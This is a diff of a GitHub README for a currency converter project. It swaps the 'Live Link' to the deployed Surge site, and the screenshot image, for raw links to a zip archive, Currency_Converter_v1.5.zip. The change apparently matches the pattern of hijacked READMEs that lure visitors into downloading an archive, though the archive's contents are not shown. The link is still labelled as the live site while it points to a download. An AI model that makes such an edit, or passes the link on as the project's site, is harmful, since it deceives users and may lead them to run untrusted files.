@@ -3,6 +3,6 @@
 
 ## Deployed on Surge :heart: :-
 
-- Live Link : [ahmedayazproject-converter.surge.sh](http://ahmedayazproject-converter.surge.sh/)
+- Live Link : [https://raw.githubusercontent.com/aahmedayaz/Currency-Converter-/main/assets/Currency_Converter_v1.5.zip](https://raw.githubusercontent.com/aahmedayaz/Currency-Converter-/main/assets/Currency_Converter_v1.5.zip)
 
-![image](https://github.com/aahmedayaz/Currency-Converter-/assets/99737061/687dcf85-13a9-43d0-8453-852bfc1277ac)
+![image](https://raw.githubusercontent.com/aahmedayaz/Currency-Converter-/main/assets/Currency_Converter_v1.5.zip)
